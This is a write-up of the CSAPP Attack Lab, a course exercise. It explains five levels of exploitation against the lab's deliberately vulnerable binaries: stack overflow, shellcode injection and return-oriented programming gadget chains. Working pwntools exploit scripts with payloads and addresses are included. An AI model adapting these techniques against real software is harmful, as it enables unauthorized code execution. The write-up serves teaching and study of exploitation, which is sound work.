# Attacklab

This is the writeup for CSAPP Attacklab

Tool: IDA/Ghidra, pwndbg, pwntools

## Part I: Code Injection Attacks

## Level 1

Simple stack overflow, without the protection of canary and ASLR. Debugger check the stack frame, find out that total 40 bytes offset away from the return address. So make a 40 bytes padding then follow the address of touch1. Done

## Level 2

It checks the argument of touch2 to be the cookie that within the `cookie.txt` file. The stack is executable, so inject a shellcode into the stack then return to the stack to execute the shellcode to make `rdi` to be the correct cookie. 

## Level 3

Level 3 require a pointer to check, however, some part of the stack will be wiped out by the function `hexmatch` and `touch3`, so store the string in somewhere away from the place they wipe out will be fine. 

Solution for Part I:

```python
#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"
warnings.simplefilter("ignore")

cookie = p32(0x59b997fa)
touch1 = p32(0x4017c0)
touch2 = p32(0x4017ec)
touch3 = p32(0x4018fa)

# p = gdb.debug(["./ctarget", "-q"])
p = process(["./ctarget", "-q"])

# exp for touch1
# p.sendline(b"A"*40 + touch1);

# exp for touch2
# shellcode = """
#     mov rdi, 0x59b997fa
#     push 0x4017ec
#     ret
# """
# print(len(asm(shellcode)))
# p.sendline(asm(shellcode) + b"A"*27 + p32(0x5561dc78));

# exp for touch3
shellcode = """
    mov rdi, 0x5561dca8
    push 0x4018fa
    ret
"""
print(len(asm(shellcode)))
p.sendline(asm(shellcode) + b"A"*27 + p64(0x5561dc78) + b"59b997fa");

print(p.readall().decode())
```

## Part II: Return-Oriented Programming

### Level 4

Same with Level 2, but with random memory address. So we are unable to access the code that we inject to the stack. The core part on `touch2` is to make `rdi = cookie`. With the help of ROPgadgets, we can find from the `farm.c` that there are two place to reach our goal:  

```assembly
getval_280:
0x4019cc
58 	 	 pop rax
90 	 	 nop
c3 	 	 ret

setval_426:
at 0x4019c5
48 89 c7 mov rdi, rax
90 		 nop
c3 		 ret
```

### Level 5

Same thing. Try to make `[rdi] = cookie`. You may find a gadget in `setval_350` that store `rsp` to `rax`. But the hard thing is that if we place where `rsp` is pointing to be the cookie value, we are unable to further jump to other places because the cookie take the place that original used for another return address. 

So, in order to bypass this issue, we can add an offset to `rsp` by `add_xy` function. So that it will point away from current position and we can store cookie string to other places. 

setval_350 mov rax, rsp

setval_426 mov rdi, rax

getval_481 pop rsp; mov



Solution for Part II:

```python
#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"
warnings.simplefilter("ignore")

cookie = p32(0x59b997fa)
touch2 = p32(0x4017ec)
touch3 = p32(0x4018fa)

p = gdb.debug(["./rtarget", "-q"])
# p = process(["./rtarget", "-q"])

# exp for touch2
# p.sendline(b"A"*40 + p64(0x4019cc) + p64(0x59b997fa) + p64(0x4019c5) + p64(0x4017ec));

# exp for touch3
p.sendline(b"A"*40 + p64(0x4019cc) + p64(0x20) + p64(0x401a42) + p64(0x401a69) + p64(0x401a27) + p64(0x401a06) + p64(0x4019c5)
        + p64(0x4019d6) + p64(0x4019c5) + p64(0x4018fa) + b"59b997fa");

print(p.readall().decode())
```







